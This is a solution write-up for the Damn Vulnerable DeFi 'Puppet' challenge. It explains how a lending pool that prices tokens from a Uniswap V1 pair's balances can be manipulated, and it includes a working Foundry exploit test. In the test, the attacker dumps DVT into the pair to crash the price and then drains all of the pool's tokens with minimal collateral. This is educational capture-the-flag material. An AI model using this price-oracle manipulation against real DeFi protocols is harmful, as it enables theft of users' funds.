## Puppet solution

The goal is to steal 100000 DVT tokens from the pool. There is a `borrow` function which lets anybody borrow tokens, although it is assumed that borrower first has to provide a collateral in ETH of twice of the borrow amount.
The pool uses UniswapPair as an oracle, fetching a relative price of the token in ETH, then multiply that price by the `amount` to borrow and the `DEPOSIT_FACTOR`. The relative price calculations are as follows: p(x) = y / x, where x==DVT and y==ETH, and the starting ratio is 1:1
```
function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
    }
```
Understanding that makes it very easy to manipulate the prices. We simply need to decrease the ETH balance of the pair and increase the token balance, which in result will break the abovementioned assumption that the borrower first needs to deposit twice the borrow amount in ETH as collateral. It can be done by swapping DVT for almost all available ETH in the pair.

```
    function testExploit() public {
        vm.startPrank(attacker);
        dvt.approve(address(uniswapV1Exchange), ATTACKER_INITIAL_TOKEN_BALANCE);
        // Swap DVT for almost all ETH in the Exchange
        uniswapV1Exchange.tokenToEthSwapInput(
            ATTACKER_INITIAL_TOKEN_BALANCE,
            9e18,
            DEADLINE
        );

        uint256 depositRequired = pool.calculateDepositRequired(
            POOL_INIITTIAL_TOKEB_BALANCE
        );

        pool.borrow{value: depositRequired}(
            POOL_INIITTIAL_TOKEB_BALANCE,
            attacker
        );
        validation();
    }
    
    function validation() public {
        // Attacker has taken all tokens from the pool
        assertGe(dvt.balanceOf(attacker), POOL_INIITTIAL_TOKEB_BALANCE);
        assertEq(dvt.balanceOf(address(pool)), 0);
    }
```